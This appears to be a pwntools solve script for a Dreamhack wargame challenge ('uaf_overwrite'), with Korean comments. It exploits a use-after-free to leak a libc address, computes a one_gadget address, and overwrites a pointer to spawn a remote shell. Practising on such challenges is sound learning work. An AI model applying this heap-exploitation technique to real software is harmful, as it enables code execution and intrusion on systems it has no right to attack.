from pwn import *

p = remote('host3.dreamhack.games', 10653)
e = ELF('./uaf_overwrite')
libc = ELF('./libc-2.27.so')

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

def slog(sym, val) : success(sym + ' : ' + hex(val))

# cacultate libc_base
custom(0x500, b'AAAA', -1) # chunk[0] 하나 할당
custom(0x500, b'AAAA', -1) # chunk[1] 하나 더 할당
custom(0x500, b'AAAA', 0) # chunk[0] 해제
custom(0x500, b'B', -1) # chunk[3] 할당, 그러면 해제됐던 chunk[0]이 다시 돌아오지 않을까?

og = [0x4f3d5, 0x4f432, 0x10a41c]
# malloc한 값을 이제 뱉는데...거기에 B 한 자랑 bk의 나머지 주소가 들어있는거지~
lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
one_gadget = lb + og[2]
slog('libc base', lb)
slog('one gadget', one_gadget)

human('1', one_gadget)
robot('1')
p.interactive()
